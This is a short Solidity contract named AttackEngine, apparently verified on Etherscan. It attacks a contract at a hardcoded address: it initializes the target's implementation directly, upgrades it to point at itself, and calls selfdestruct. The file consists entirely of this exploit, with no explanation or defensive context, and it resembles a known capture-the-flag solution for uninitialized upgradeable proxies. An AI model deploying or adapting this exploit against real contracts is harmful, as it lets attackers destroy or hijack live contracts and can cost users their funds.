/**
 *Submitted for verification at Etherscan.io on 2023-02-22
*/

// SPDX-License-Identifier: MIT
 
pragma solidity ^0.8.0;

interface IEngine {
    function initialize() external payable;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function destructAtk() external payable;
}

 contract AttackEngine {

     function initialize() external payable returns(address){
        IEngine(0x67E3fd5064005160cc38F88883E5f64391Dd0c15).initialize();
     }

     function upgrade() external {
         IEngine(0x67E3fd5064005160cc38F88883E5f64391Dd0c15).upgradeToAndCall(address(this), "");
     }
     function destruct() external {
         IEngine(0x67E3fd5064005160cc38F88883E5f64391Dd0c15).destructAtk();
     }

     function destructAtk() external payable {
         address payable destroyAddress = payable(address(msg.sender));
         selfdestruct(destroyAddress);
     }
 }